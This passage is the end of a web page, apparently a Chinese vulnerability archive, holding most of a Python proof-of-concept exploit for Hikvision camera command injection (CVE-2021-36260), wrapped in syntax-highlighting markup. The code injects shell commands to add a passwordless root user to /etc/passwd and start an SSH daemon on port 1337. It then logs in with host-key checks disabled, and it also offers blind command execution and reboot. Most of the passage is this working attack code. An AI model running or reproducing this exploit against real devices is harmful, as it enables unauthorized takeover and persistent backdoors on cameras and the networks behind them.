    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[-] Error execute cmd &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">}</span></span><span class="token string">&quot;&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[i] Try execute blind cmd &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">}</span></span><span class="token string">&quot;&#39;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">&#39;/N&#39;</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[i] Remote &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">&quot; not pwned, pwning now!&#39;</span></span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">&#39;echo -n P::0:0:W&gt;N&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">401</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">&#39;echo :/:/bin/sh&gt;&gt;N&#39;</span><span class="token punctuation">)</span>
        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">&#39;cat N&gt;&gt;/etc/passwd&#39;</span><span class="token punctuation">)</span>
        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">&#39;dropbear -R -B -p 1337&#39;</span><span class="token punctuation">)</span>
        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">&#39;cat N&gt;webLib/N&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[i] Remote &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">&quot; already pwned&#39;</span></span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[*] Trying SSH to </span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string"> on port 1337&#39;</span></span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>f&#39;stty echo<span class="token punctuation">;</span> stty iexten<span class="token punctuation">;</span> stty icanon<span class="token punctuation">;</span> \\
    ssh <span class="token operator">-</span>o StrictHostKeyChecking<span class="token operator">=</span>no <span class="token operator">-</span>o LogLevel<span class="token operator">=</span>error <span class="token operator">-</span>o UserKnownHostsFile<span class="token operator">=</span><span class="token operator">/</span>dev<span class="token operator">/</span>null \\
    P@<span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span> <span class="token operator">-</span>p <span class="token number">1337</span>&#39;<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Hikvision CVE-2021-36260\\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#39;</span><span class="token punctuation">)</span>

    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--rhost&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Remote Target Address (IP/FQDN)&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--rport&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Remote Target Port&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--check&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Check if vulnerable&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--reboot&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Reboot if vulnerable&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--shell&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Launch SSH shell&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--cmd&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;execute cmd (i.e: &quot;ls -l&quot;)&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--cmd_blind&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;execute blind cmd (i.e: &quot;reboot&quot;)&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span>
        <span class="token string">&#39;--noverify&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Do not verify if vulnerable&#39;</span>
    <span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span>
        <span class="token string">&#39;--proto&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;https&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Protocol used&#39;</span>
    <span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    remote <span class="token operator">=</span> Http<span class="token punctuation">(</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">,</span> args<span class="token punctuation">.</span>rport<span class="token punctuation">,</span> args<span class="token punctuation">.</span>proto<span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> args<span class="token punctuation">.</span>shell<span class="token punctuation">:</span>
            shell<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>cmd<span class="token punctuation">:</span>
            cmd<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">:</span>
            cmd_blind<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>check<span class="token punctuation">:</span>
            check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>reboot<span class="token punctuation">:</span>
            check_reboot<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,20),o=[p];function c(i,l){return s(),a("div",null,o)}const k=n(e,[["render",c],["__file","HIKVISION DSIDSIPC 等设备 远程命令执行漏洞 CVE-2021-36260.html.vue"]]);export{k as default};
